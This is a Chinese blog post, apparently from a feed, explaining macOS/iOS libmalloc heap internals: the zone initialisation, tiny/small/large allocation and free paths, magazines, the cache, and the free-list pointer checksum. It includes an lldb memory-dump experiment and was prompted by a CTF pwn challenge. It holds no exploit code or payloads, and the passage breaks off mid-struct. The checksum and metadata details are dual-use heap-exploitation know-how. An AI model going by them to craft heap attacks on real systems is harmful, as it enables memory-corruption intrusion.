    <content type="html"><![CDATA[<h3 id="源码解读macOS-iOS-Heap"><a href="#源码解读macOS-iOS-Heap" class="headerlink" title="源码解读macOS/iOS Heap"></a>源码解读macOS/iOS Heap</h3><blockquote><p>关于linux的堆管理已经有很多人写了很多相关的分析，但在mac平台的堆相关的资料却很少。本文由tctf的一道mac平台pwn题目引起，是我对macOS/iOS的堆管理的一些理解，希望有所帮助。</p></blockquote><h4 id="从malloc说起"><a href="#从malloc说起" class="headerlink" title="从malloc说起"></a>从malloc说起</h4><p><code>malloc</code>是我们经常使用的函数，这里也是<code>libmalloc.dylib</code>暴露出来的接口，另外苹果开源了<a href="https://opensource.apple.com/source/libmalloc/" target="_blank" rel="external">libmalloc代码</a>。所以接下来我们就从源码的角度深入下去。</p><pre><code class="c">void *malloc(size_t size){    void *retval;    retval = malloc_zone_malloc(default_zone, size);    if (retval == NULL) {        errno = ENOMEM;    }    return retval;}</code></pre><p>这里实际调用了<code>malloc_zone_malloc</code>函数，传入了<code>default_zone</code>全局变量</p><pre><code class="c">static virtual_default_zone_t virtual_default_zone__attribute__((section(&quot;__DATA,__v_zone&quot;)))__attribute__((aligned(PAGE_MAX_SIZE))) = {    NULL,    NULL,    default_zone_size,    default_zone_malloc,    default_zone_calloc,    default_zone_valloc,    default_zone_free,    default_zone_realloc,    default_zone_destroy,    DEFAULT_MALLOC_ZONE_STRING,    default_zone_batch_malloc,    default_zone_batch_free,    &amp;default_zone_introspect,    10,    default_zone_memalign,    default_zone_free_definite_size,    default_zone_pressure_relief,    default_zone_malloc_claimed_address,};static malloc_zone_t *default_zone = &amp;virtual_default_zone.malloc_zone;</code></pre><p>这里初始化了一个默认的zone，正如名字一样<code>virtual_default_zone</code>其实是一个虚假的zone，接下来是调用<code>malloc_zone_malloc</code></p><pre><code class="c">void *malloc_zone_malloc(malloc_zone_t *zone, size_t size){    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_START, (uintptr_t)zone, size, 0, 0);    void *ptr;    if (malloc_check_start &amp;&amp; (malloc_check_counter++ &gt;= malloc_check_start)) {        internal_check();    }    if (size &gt; MALLOC_ABSOLUTE_MAX_SIZE) {        return NULL;    }    ptr = zone-&gt;malloc(zone, size);        // if lite zone is passed in then we still call the lite methods    if (malloc_logger) {        malloc_logger(MALLOC_LOG_TYPE_ALLOCATE | MALLOC_LOG_TYPE_HAS_ZONE, (uintptr_t)zone, (uintptr_t)size, 0, (uintptr_t)ptr, 0);    }    MALLOC_TRACE(TRACE_malloc | DBG_FUNC_END, (uintptr_t)zone, size, (uintptr_t)ptr, 0);    return ptr;}</code></pre><p>这里调用的<code>ptr = zone-&gt;malloc(zone, size);</code>就是<code>default_zone_malloc</code>函数</p><pre><code class="c">static void *default_zone_malloc(malloc_zone_t *zone, size_t size){    zone = runtime_default_zone();    return zone-&gt;malloc(zone, size);}</code></pre><p>这里的<code>runtime_default_zone()</code>很重要，其实这里才是去真正的初始化zone</p><pre><code class="c">runtime_default_zone   // inline----inline_malloc_default_zone  //inline--------_malloc_initialize_once  //inline ------------_malloc_initialize()</code></pre><p>下面看<code>_malloc_initialize</code>函数，去掉了一些不相干代码</p><pre><code class="c">static void_malloc_initialize(void *context __unused){    MALLOC_LOCK();    unsigned n;    malloc_zone_t *zone = NULL;    ...    zone = create_scalable_zone(0, malloc_debug_flags);    malloc_zone_register_while_locked(zone);    malloc_set_zone_name(zone, DEFAULT_MALLOC_ZONE_STRING);        initial_default_zone = zone;    if (n != 0) { // make the default first, for efficiency        unsigned protect_size = malloc_num_zones_allocated * sizeof(malloc_zone_t *);        malloc_zone_t *hold = malloc_zones[0];        if (hold-&gt;zone_name &amp;&amp; strcmp(hold-&gt;zone_name, DEFAULT_MALLOC_ZONE_STRING) == 0) {            malloc_set_zone_name(hold, NULL);        }        mprotect(malloc_zones, protect_size, PROT_READ | PROT_WRITE);        malloc_zones[0] = malloc_zones[n];        malloc_zones[n] = hold;        mprotect(malloc_zones, protect_size, PROT_READ);    }    ...}</code></pre><p>这里主要看<code>create_scalable_zone</code>函数，所以默认的zone实际上就是scalable zone</p><pre><code class="c">malloc_zone_t *create_scalable_zone(size_t initial_size, unsigned debug_flags) {    return (malloc_zone_t *) create_scalable_szone(initial_size, debug_flags);}szone_t *create_scalable_szone(size_t initial_size, unsigned debug_flags){    szone_t *szone;    /* get memory for the zone. */    szone = mvm_allocate_pages(SZONE_PAGED_SIZE, 0, 0, VM_MEMORY_MALLOC);    if (!szone) {        return NULL;    }    ...    // Query the number of configured processors.    // Uniprocessor case gets just one tiny and one small magazine (whose index is zero). This gives    // the same behavior as the original scalable malloc. MP gets per-CPU magazines    // that scale (way) better.    unsigned int max_mags = mag_max_magazines();    uint32_t num_magazines = (max_mags &gt; 1) ? MIN(max_mags, TINY_MAX_MAGAZINES) : 1;    rack_init(&amp;szone-&gt;tiny_rack, RACK_TYPE_TINY, num_magazines, debug_flags);    rack_init(&amp;szone-&gt;small_rack, RACK_TYPE_SMALL, num_magazines, debug_flags);#if CONFIG_LARGE_CACHE    // madvise(..., MADV_REUSABLE) death-row arrivals above this threshold [~0.1%]    szone-&gt;large_entry_cache_reserve_limit = (size_t)(memsize &gt;&gt; 10);    /* &lt;rdar://problem/6610904&gt; Reset protection when returning a previous large allocation? */    int32_t libSystemVersion = NSVersionOfLinkTimeLibrary(&quot;System&quot;);    if ((-1 != libSystemVersion) &amp;&amp; ((libSystemVersion &gt;&gt; 16) &lt; 112) /* CFSystemVersionSnowLeopard */) {        szone-&gt;large_legacy_reset_mprotect = TRUE;    } else {        szone-&gt;large_legacy_reset_mprotect = FALSE;    }#endif    // Initialize the security token.    szone-&gt;cookie = (uintptr_t)malloc_entropy[0];    szone-&gt;basic_zone.version = 10;    szone-&gt;basic_zone.size = (void *)szone_size;    szone-&gt;basic_zone.malloc = (void *)szone_malloc;    szone-&gt;basic_zone.calloc = (void *)szone_calloc;    szone-&gt;basic_zone.valloc = (void *)szone_valloc;    szone-&gt;basic_zone.free = (void *)szone_free;    szone-&gt;basic_zone.realloc = (void *)szone_realloc;    szone-&gt;basic_zone.destroy = (void *)szone_destroy;    szone-&gt;basic_zone.batch_malloc = (void *)szone_batch_malloc;    szone-&gt;basic_zone.batch_free = (void *)szone_batch_free;    szone-&gt;basic_zone.introspect = (struct malloc_introspection_t *)&amp;szone_introspect;    szone-&gt;basic_zone.memalign = (void *)szone_memalign;    szone-&gt;basic_zone.free_definite_size = (void *)szone_free_definite_size;    szone-&gt;basic_zone.pressure_relief = (void *)szone_pressure_relief;    szone-&gt;basic_zone.claimed_address = (void *)szone_claimed_address;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved1 = 0;    /* Set to zero once and for all as required by CFAllocator. */    szone-&gt;basic_zone.reserved2 = 0;    /* Prevent overwriting the function pointers in basic_zone. */    mprotect(szone, sizeof(szone-&gt;basic_zone), PROT_READ);    szone-&gt;debug_flags = debug_flags;    _malloc_lock_init(&amp;szone-&gt;large_szone_lock);    szone-&gt;cpu_id_key = -1UL; // Unused.    CHECK(szone, __PRETTY_FUNCTION__);    return szone;}</code></pre><p>这个函数分配并且初始化了szone，设置了<code>szone_malloc</code>、<code>szone_free</code>等函数</p><p>所以后面在调用<code>malloc</code>和<code>free</code>的时候实际上调用的是<code>szone_malloc</code>、<code>szone_free</code>。<code>szone_malloc</code>的实现涉及到苹果关于堆设计中最重要的部分，这里先不展开讲解。可以看出苹果设计的这种结构很方便扩展，事实上的确如此，不仅是scalable zone，还可以注册WebKit Malloc、GFXMallocZone、QuartzCore。由对应zone的<code>malloc_zone_*</code>进行实际的内存分配工作。</p><p>下面是程序第一次调用malloc的栈帧，可以看出与我们分析的调用顺序一致</p><pre><code class="c"> *  frame #0: 0x00007fff60bd72af libsystem_malloc.dylib`create_scalable_szone    frame #1: 0x00007fff60bd6e71 libsystem_malloc.dylib`_malloc_initialize + 1482    frame #2: 0x00007fff60c0facb libsystem_platform.dylib`_os_once_callout + 18    frame #3: 0x00007fff60bd68a5 libsystem_malloc.dylib`default_zone_malloc + 77    frame #4: 0x00007fff60bd6807 libsystem_malloc.dylib`malloc_zone_malloc + 103    frame #5: 0x00007fff60bd6783 libsystem_malloc.dylib`malloc + 24    frame #6: 0x00007fff60a9831d libsystem_c.dylib`arc4_init + 109    frame #7: 0x00007fff60a98479 libsystem_c.dylib`arc4random_buf + 37    frame #8: 0x00007fff5f94644e libobjc.A.dylib`_read_images + 396    frame #9: 0x00007fff5f945473 libobjc.A.dylib`map_images_nolock + 1197    frame #10: 0x00007fff5f959279 libobjc.A.dylib`map_images + 68    ....</code></pre><h4 id="scalable-zone"><a href="#scalable-zone" class="headerlink" title="scalable zone"></a>scalable zone</h4><p>szone包含两个racks，分别是tiny和small rack</p><table><thead><tr><th>rack</th><th>32位机器</th><th>64位机器</th></tr></thead><tbody><tr><td>tiny</td><td>&lt;= 496B</td><td>&lt;= 1008B</td></tr><tr><td>small</td><td>&lt;= 128KB</td><td>&lt;=128KB</td></tr></tbody></table><p>大于127KB的就由large allocator分配，直接采用分配页大小的方式。这里不详细讨论。</p><ul><li>有几个处理器，rack就有几个magazine</li><li>每个magazine有多个regions，tiny(1MB)、small(8MB)</li><li>每个region被分为quantum，tiny(16B，64520 Q/region)、small(512B，16319 Q/region)</li></ul><p>具体可以从后面结构体中看出来其包含关系。</p><h5 id="malloc-gt-szone-malloc-gt-szone-malloc-should-clear"><a href="#malloc-gt-szone-malloc-gt-szone-malloc-should-clear" class="headerlink" title="malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear"></a>malloc-&gt;szone_malloc-&gt;szone_malloc_should_clear</h5><pre><code class="c">MALLOC_NOINLINE void *szone_malloc_should_clear(szone_t *szone, size_t size, boolean_t cleared_requested){    void *ptr;    msize_t msize;    if (size &lt;= SMALL_THRESHOLD) {        // tiny size: &lt;=1008 bytes (64-bit), &lt;=496 bytes (32-bit)        // think tiny        msize = TINY_MSIZE_FOR_BYTES(size + TINY_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = tiny_malloc_should_clear(&amp;szone-&gt;tiny_rack, msize, cleared_requested);    } else if (size &lt;= szone-&gt;large_threshold) {        // small size: &lt;=15k (iOS), &lt;=64k (large iOS), &lt;=128k (macOS)        // think small        msize = SMALL_MSIZE_FOR_BYTES(size + SMALL_QUANTUM - 1);        if (!msize) {            msize = 1;        }        ptr = small_malloc_should_clear(&amp;szone-&gt;small_rack, msize, cleared_requested);    } else {        // large: all other allocations        size_t num_kernel_pages = round_page_quanta(size) &gt;&gt; vm_page_quanta_shift;        if (num_kernel_pages == 0) { /* Overflowed */            ptr = 0;        } else {            ptr = large_malloc(szone, num_kernel_pages, 0, cleared_requested);        }    }    return ptr;}</code></pre><p>上面可以清楚看出会根据其申请内存大小从tiny、small、large三种方式分配。这里以tiny为例</p><h5 id="tiny-malloc-should-clear"><a href="#tiny-malloc-should-clear" class="headerlink" title="tiny_malloc_should_clear"></a>tiny_malloc_should_clear</h5><pre><code class="c">void *tiny_malloc_should_clear(rack_t *rack, msize_t msize, boolean_t cleared_requested){    void *ptr;    mag_index_t mag_index = tiny_mag_get_thread_index() % rack-&gt;num_magazines;    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_malloc, (uintptr_t)rack, TINY_BYTES_FOR_MSIZE(msize), (uintptr_t)tiny_mag_ptr, cleared_requested);#if DEBUG_MALLOC    if (DEPOT_MAGAZINE_INDEX == mag_index) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;malloc called for magazine index -1\n&quot;);        return (NULL);    }    if (!msize) {        malloc_zone_error(rack-&gt;debug_flags, true, &quot;invariant broken (!msize) in allocation (region)\n&quot;);        return (NULL);    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    ptr = tiny_mag_ptr-&gt;mag_last_free;    if (tiny_mag_ptr-&gt;mag_last_free_msize == msize) {        // we have a winner        tiny_mag_ptr-&gt;mag_last_free = NULL;        tiny_mag_ptr-&gt;mag_last_free_msize = 0;        tiny_mag_ptr-&gt;mag_last_free_rgn = NULL;        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        CHECK(szone, __PRETTY_FUNCTION__);        if (cleared_requested) {            memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));        }#if DEBUG_MALLOC        if (LOG(szone, ptr)) {            malloc_report(ASL_LEVEL_INFO, &quot;in tiny_malloc_should_clear(), tiny cache ptr=%p, msize=%d\n&quot;, ptr, msize);        }#endif        return ptr;    }#endif /* CONFIG_TINY_CACHE */    while (1) {        ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);        if (ptr) {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            if (cleared_requested) {                memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));            }            return ptr;        }        if (tiny_get_region_from_depot(rack, tiny_mag_ptr, mag_index, msize)) {            ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);            if (ptr) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                if (cleared_requested) {                    memset(ptr, 0, TINY_BYTES_FOR_MSIZE(msize));                }                return ptr;            }        }        // The magazine is exhausted. A new region (heap) must be allocated to satisfy this call to malloc().        // The allocation, an mmap() system call, will be performed outside the magazine spin locks by the first        // thread that suffers the exhaustion. That thread sets &quot;alloc_underway&quot; and enters a critical section.        // Threads arriving here later are excluded from the critical section, yield the CPU, and then retry the        // allocation. After some time the magazine is resupplied, the original thread leaves with its allocation,        // and retry-ing threads succeed in the code just above.        if (!tiny_mag_ptr-&gt;alloc_underway) {            void *fresh_region;            // time to create a new region (do this outside the magazine lock)            tiny_mag_ptr-&gt;alloc_underway = TRUE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            fresh_region = mvm_allocate_pages_securely(TINY_REGION_SIZE, TINY_BLOCKS_ALIGN, VM_MEMORY_MALLOC_TINY, rack-&gt;debug_flags);            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);            // DTrace USDT Probe            MAGMALLOC_ALLOCREGION(TINY_SZONE_FROM_RACK(rack), (int)mag_index, fresh_region, TINY_REGION_SIZE);            if (!fresh_region) { // out of memory!                tiny_mag_ptr-&gt;alloc_underway = FALSE;                OSMemoryBarrier();                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                return NULL;            }            ptr = tiny_malloc_from_region_no_lock(rack, tiny_mag_ptr, mag_index, msize, fresh_region);            // we don&#39;t clear because this freshly allocated space is pristine            tiny_mag_ptr-&gt;alloc_underway = FALSE;            OSMemoryBarrier();            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            CHECK(szone, __PRETTY_FUNCTION__);            return ptr;        } else {            SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);            yield();            SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);        }    }    /* NOTREACHED */}</code></pre><p>这里的<code>if (tiny_mag_ptr-&gt;mag_last_free_msize == msize)</code>是判断申请大小是否和缓存的大小相同，如果相同，则直接把该内存返回给程序。反之则从<code>ptr = tiny_malloc_from_free_list(rack, tiny_mag_ptr, mag_index, msize);</code>free list中去获取刚好大于该大小的free list。这里的free list是按quantum的倍数递增的一个链表。若还是不能满足则去freelist中由合并得到的较大block中去分配。还不能满足则去region剩余部分申请。最后还不满足则申请新的一个region。申请失败则返回NULL。</p><h5 id="free-gt-malloc-zone-free-gt-szone-free"><a href="#free-gt-malloc-zone-free-gt-szone-free" class="headerlink" title="free-&gt;malloc_zone_free-&gt;szone_free"></a>free-&gt;malloc_zone_free-&gt;szone_free</h5><pre><code class="c">voidszone_free(szone_t *szone, void *ptr){    region_t tiny_region;    region_t small_region;#if DEBUG_MALLOC    if (LOG(szone, ptr)) {        malloc_report(ASL_LEVEL_INFO, &quot;in szone_free with %p\n&quot;, ptr);    }#endif    if (!ptr) {        return;    }    /*     * Try to free to a tiny region.     */    if ((uintptr_t)ptr &amp; (TINY_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed\n&quot;, ptr);        return;    }    if ((tiny_region = tiny_region_for_ptr_no_lock(&amp;szone-&gt;tiny_rack, ptr)) != NULL) {        if (TINY_INDEX_FOR_PTR(ptr) &gt;= NUM_TINY_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed\n&quot;, ptr);            return;        }        free_tiny(&amp;szone-&gt;tiny_rack, ptr, tiny_region, 0);        return;    }    /*     * Try to free to a small region.     */    if ((uintptr_t)ptr &amp; (SMALL_QUANTUM - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;Non-aligned pointer %p being freed (2)\n&quot;, ptr);        return;    }    if ((small_region = small_region_for_ptr_no_lock(&amp;szone-&gt;small_rack, ptr)) != NULL) {        if (SMALL_META_INDEX_FOR_PTR(ptr) &gt;= NUM_SMALL_BLOCKS) {            malloc_zone_error(szone-&gt;debug_flags, true, &quot;Pointer %p to metadata being freed (2)\n&quot;, ptr);            return;        }        free_small(&amp;szone-&gt;small_rack, ptr, small_region, 0);        return;    }    /* check that it&#39;s a legal large allocation */    if ((uintptr_t)ptr &amp; (vm_page_quanta_size - 1)) {        malloc_zone_error(szone-&gt;debug_flags, true, &quot;non-page-aligned, non-allocated pointer %p being freed\n&quot;, ptr);        return;    }    free_large(szone, ptr);}</code></pre><p>同样，free的时候会先判断该内存是否属于tiny，small，large。则选取对应的free函数。这里以tiny为例</p><pre><code class="c">voidfree_tiny(rack_t *rack, void *ptr, region_t tiny_region, size_t known_size){    msize_t msize;    boolean_t is_free;    mag_index_t mag_index = MAGAZINE_INDEX_FOR_TINY_REGION(tiny_region);    magazine_t *tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);    MALLOC_TRACE(TRACE_tiny_free, (uintptr_t)rack, (uintptr_t)ptr, (uintptr_t)tiny_mag_ptr, known_size);    // ptr is known to be in tiny_region    if (known_size) {        msize = TINY_MSIZE_FOR_BYTES(known_size + TINY_QUANTUM - 1);    } else {        msize = get_tiny_meta_header(ptr, &amp;is_free);        if (is_free) {            free_tiny_botch(rack, ptr);            return;        }    }#if DEBUG_MALLOC    if (!msize) {        malloc_report(ASL_LEVEL_ERR, &quot;*** free_tiny() block in use is too large: %p\n&quot;, ptr);        return;    }#endif    SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);#if CONFIG_TINY_CACHE    // Depot does not participate in CONFIG_TINY_CACHE since it can&#39;t be directly malloc()&#39;d    if (DEPOT_MAGAZINE_INDEX != mag_index) {        if (msize &lt; TINY_QUANTUM) {                      // to see if the bits fit in the last 4 bits            void *ptr2 = tiny_mag_ptr-&gt;mag_last_free; // Might be NULL            msize_t msize2 = tiny_mag_ptr-&gt;mag_last_free_msize;            region_t rgn2 = tiny_mag_ptr-&gt;mag_last_free_rgn;            /* check that we don&#39;t already have this pointer in the cache */            if (ptr == ptr2) {                free_tiny_botch(rack, ptr);                return;            }            if ((rack-&gt;debug_flags &amp; MALLOC_DO_SCRIBBLE) &amp;&amp; msize) {                memset(ptr, SCRABBLE_BYTE, TINY_BYTES_FOR_MSIZE(msize));            }            tiny_mag_ptr-&gt;mag_last_free = ptr;            tiny_mag_ptr-&gt;mag_last_free_msize = msize;            tiny_mag_ptr-&gt;mag_last_free_rgn = tiny_region;            if (!ptr2) {                SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);                CHECK(szone, __PRETTY_FUNCTION__);                return;            }            msize = msize2;            ptr = ptr2;            tiny_region = rgn2;        }    }#endif /* CONFIG_TINY_CACHE */    // Now in the time it took to acquire the lock, the region may have migrated    // from one magazine to another. I.e. trailer-&gt;mag_index is volatile.    // In which case the magazine lock we obtained (namely magazines[mag_index].mag_lock)    // is stale. If so, keep on tryin&#39; ...    region_trailer_t *trailer = REGION_TRAILER_FOR_TINY_REGION(tiny_region);    mag_index_t refreshed_index;    while (mag_index != (refreshed_index = trailer-&gt;mag_index)) { // Note assignment        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);        mag_index = refreshed_index;        tiny_mag_ptr = &amp;(rack-&gt;magazines[mag_index]);        SZONE_MAGAZINE_PTR_LOCK(tiny_mag_ptr);    }    if (tiny_free_no_lock(rack, tiny_mag_ptr, mag_index, tiny_region, ptr, msize)) {        SZONE_MAGAZINE_PTR_UNLOCK(tiny_mag_ptr);    }    CHECK(szone, __PRETTY_FUNCTION__);}</code></pre><p>free的时候先将该内存缓存到<code>mag_last_free</code>，若之前<code>mag_last_free</code>为NULL，那么该内存暂时不会被free，仅仅是缓存到<code>mag_last_free</code>。反之，则会将<code>mag_last_free</code>之前的内存free。在free的时候会尝试向前向后合并。合并完成后设置其前后chunk指针等metadata后将其放入对应的free list大小之中。这里需要有注意以下几点</p><ul><li>最近free的内存会被缓存，不会立即合并</li><li>在被free的块metadata是被保护的<ul><li>前后指针按16字节大小对齐</li><li>指针前4位为checksum</li></ul></li></ul><p>关于free块checksum计算如下：</p><pre><code class="c">static MALLOC_INLINE uintptr_tfree_list_checksum_ptr(rack_t *rack, void *ptr){    uintptr_t p = (uintptr_t)ptr;    return (p &gt;&gt; NYBBLE) | ((free_list_gen_checksum(p ^ rack-&gt;cookie) &amp; (uintptr_t)0xF) &lt;&lt; ANTI_NYBBLE); // compiles to rotate instruction}</code></pre><p>指针p与cookie异或然后计算checksum后左移到最高字节或上指针p右移4位得到checksumed后的指针。</p><h4 id="实验"><a href="#实验" class="headerlink" title="实验"></a>实验</h4><p>代码如下</p><pre><code class="c">#include &lt;stdio.h&gt;int main(int argc, char *argv[]) {    void *p1,*p2,*p3,*p4;    p1 = malloc(24);    p2 = malloc(24);    p3 = malloc(24);    p4 = malloc(24);    memset(p1,0xaa,24);    memset(p2,0xbb,24);    memset(p3,0xcc,24);    free(p1);    free(p3);    free(p2);    free(p4);}</code></pre><p>free(p1)，直接将p1缓存，所以内存值不变</p><pre><code class="c">(lldb) x/24gx p10x1002001f0: 0xaaaaaaaaaaaaaaaa 0xaaaaaaaaaaaaaaaa0x100200200: 0xaaaaaaaaaaaaaaaa 0x00007fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p3)，p3放入缓存，p1放入大小为32字节的freelist，p1previous指针8字节设为NULL，next指针指向设为下一个free block，紧接着后面为该block大小，2*quantum=32字节</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0xcccccccccccccccc 0xcccccccccccccccc0x100200240: 0xcccccccccccccccc 0x0000000000000000</code></pre><p>free(p2)，p2放入缓存，p3放入大小为32字节的freelist，p3previous指针8字节设为NULL，next指针指向设为下一个p1</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x3000000010020023 0x10000000100201080x100200200: 0xaaaaaaaaaaaa0002 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x200000001002001f0x100200240: 0xcccccccccccc0002 0x00020000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>free(p4)，p2向前向后合并，合并p1，p3。指向p1，大小为6*quantum=96字节。previous指针8字节设为NULL，next指针指向设为下一个大小为3Q的block</p><pre><code>(lldb) x/24gx p10x1002001f0: 0x0000000000000000 0x50000000100200480x100200200: 0xaaaaaaaaaaaa0006 0x00027fff5f94d99c0x100200210: 0xbbbbbbbbbbbbbbbb 0xbbbbbbbbbbbbbbbb0x100200220: 0xbbbbbbbbbbbbbbbb 0x00000000000000000x100200230: 0x0000000000000000 0x10000000100201080x100200240: 0xcccccccccccc0002 0x00060000000000000x100200250: 0x0000000000000000 0x00000000000000000x100200260: 0x0000000000000029 0x0000000000000000</code></pre><p>上面可以看出previous和next指针前4位都包含checksum。与上面描述的一致。</p><h4 id="libmalloc中一些结构体"><a href="#libmalloc中一些结构体" class="headerlink" title="libmalloc中一些结构体"></a>libmalloc中一些结构体</h4><h5 id="szone-s-magazine-zone-h"><a href="#szone-s-magazine-zone-h" class="headerlink" title="szone_s // magazine_zone.h"></a>szone_s // magazine_zone.h</h5><pre><code class="c">typedef struct szone_s {      // vm_allocate()&#39;d, so page-aligned to begin with.    malloc_zone_t basic_zone; // first page will be given read-only protection    uint8_t pad[PAGE_MAX_SIZE - sizeof(malloc_zone_t)];    unsigned long cpu_id_key; // unused    // remainder of structure is R/W (contains no function pointers)    unsigned debug_flags;    void *log_address;    /* Allocation racks per allocator type. */    struct rack_s tiny_rack;    struct rack_s small_rack;    /* large objects: all the rest */    _malloc_lock_s large_szone_lock MALLOC_CACHE_ALIGN; // One customer at a time for large    unsigned num_large_objects_in_use;    unsigned num_large_entries;    large_entry_t *large_entries; // hashed by location; null entries don&#39;t count    size_t num_bytes_in_large_objects;#if CONFIG_LARGE_CACHE    int large_entry_cache_oldest;    int large_entry_cache_newest;    large_entry_t large_entry_cache[LARGE_ENTRY_CACHE_SIZE]; // &quot;death row&quot; for large malloc/free    boolean_t large_legacy_reset_mprotect;    size_t large_entry_cache_reserve_bytes;    size_t large_entry_cache_reserve_limit;    size_t large_entry_cache_bytes; // total size of death row, bytes#endif    /* flag and limits pertaining to altered malloc behavior for systems with     * large amounts of physical memory */    unsigned is_largemem;    unsigned large_threshold;    unsigned vm_copy_threshold;    /* security cookie */    uintptr_t cookie;    /* The purgeable zone constructed by create_purgeable_zone() would like to hand off tiny and small     * allocations to the default scalable zone. Record the latter as the &quot;helper&quot; zone here. */    struct szone_s *helper_zone;    boolean_t flotsam_enabled;} szone_t;</code></pre><h5 id="malloc-zone-t-malloc-h"><a href="#malloc-zone-t-malloc-h" class="headerlink" title="malloc_zone_t // malloc.h"></a>malloc_zone_t // malloc.h</h5><pre><code class="c">typedef struct _malloc_zone_t {    /* Only zone implementors should depend on the layout of this structure;    Regular callers should use the access functions below */    void    *reserved1;    /* RESERVED FOR CFAllocator DO NOT USE */    void    *reserved2;    /* RESERVED FOR CFAllocator DO NOT USE */    size_t     (* MALLOC_ZONE_FN_PTR(size))(struct _malloc_zone_t *zone, const void *ptr); /* returns the size of a block or 0 if not in this zone; must be fast, especially for negative answers */    void     *(* MALLOC_ZONE_FN_PTR(malloc))(struct _malloc_zone_t *zone, size_t size);    void     *(* MALLOC_ZONE_FN_PTR(calloc))(struct _malloc_zone_t *zone, size_t num_items, size_t size); /* same as malloc, but block returned is set to zero */    void     *(* MALLOC_ZONE_FN_PTR(valloc))(struct _malloc_zone_t *zone, size_t size); /* same as malloc, but block returned is set to zero and is guaranteed to be page aligned */    void     (* MALLOC_ZONE_FN_PTR(free))(struct _malloc_zone_t *zone, void *ptr);    void     *(* MALLOC_ZONE_FN_PTR(realloc))(struct _malloc_zone_t *zone, void *ptr, size_t size);    void     (* MALLOC_ZONE_FN_PTR(destroy))(struct _malloc_zone_t *zone); /* zone is destroyed and all memory reclaimed */g    const char    *zone_name;    /* Optional batch callbacks; these may be NULL */    unsigned    (* MALLOC_ZONE_FN_PTR(batch_malloc))(struct _malloc_zone_t *zone, size_t size, void **results, unsigned num_requested); /* given a size, returns pointers capable of holding that size; returns the number of pointers allocated (maybe 0 or less than num_requested) */    void    (* MALLOC_ZONE_FN_PTR(batch_free))(struct _malloc_zone_t *zone, void **to_be_freed, unsigned num_to_be_freed); /* frees all the pointers in to_be_freed; note that to_be_freed may be overwritten during the process */    struct malloc_introspection_t    * MALLOC_INTROSPECT_TBL_PTR(introspect);    unsigned    version;    /* aligned memory allocation. The callback may be NULL. Present in version &gt;= 5. */    void *(* MALLOC_ZONE_FN_PTR(memalign))(struct _malloc_zone_t *zone, size_t alignment, size_t size);    /* free a pointer known to be in zone and known to have the given size. The callback may be NULL. Present in version &gt;= 6.*/    void (* MALLOC_ZONE_FN_PTR(free_definite_size))(struct _malloc_zone_t *zone, void *ptr, size_t size);    /* Empty out caches in the face of memory pressure. The callback may be NULL. Present in version &gt;= 8. */    size_t     (* MALLOC_ZONE_FN_PTR(pressure_relief))(struct _malloc_zone_t *zone, size_t goal);    /*     * Checks whether an address might belong to the zone. May be NULL. Present in version &gt;= 10.     * False positives are allowed (e.g. the pointer was freed, or it&#39;s in zone space that has     * not yet been allocated. False negatives are not allowed.     */    boolean_t (* MALLOC_ZONE_FN_PTR(claimed_address))(struct _malloc_zone_t *zone, void *ptr);} malloc_zone_t;</code></pre><h5 id="rack-t-magazine-rack-h"><a href="#rack-t-magazine-rack-h" class="headerlink" title="rack_t // magazine_rack.h"></a>rack_t // magazine_rack.h</h5><pre><code class="c">typedef struct rack_s {    /* Regions for tiny objects */    _malloc_lock_s region_lock MALLOC_CACHE_ALIGN;    rack_type_t type;    size_t num_regions;    size_t num_regions_dealloc;    region_hash_generation_t *region_generation;    region_hash_generation_t rg[2];    region_t initial_regions[INITIAL_NUM_REGIONS];    int num_magazines;    unsigned num_magazines_mask;    int 